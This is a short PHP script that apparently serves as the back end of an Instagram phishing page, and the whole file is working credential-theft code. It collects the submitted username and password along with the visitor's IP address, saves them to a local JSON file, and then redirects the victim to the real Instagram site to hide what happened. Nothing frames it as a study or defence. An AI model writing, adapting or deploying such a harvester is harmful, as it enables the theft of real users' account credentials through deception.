<?php


if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip_address = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ip_address = $_SERVER['REMOTE_ADDR']."\r\n";
    }

    
$user = $_POST['username'];
$pass = $_POST['password'];
$data['dev'] = array('username' => $user, 'password'=>$pass,'ipaddress'=>$ip_address);


$jdata = json_encode($data);

$file = fopen('userdata.json', 'w');
fwrite($file,$jdata);
fclose($file);

header('Location: https://instagram.com');
exit();


?>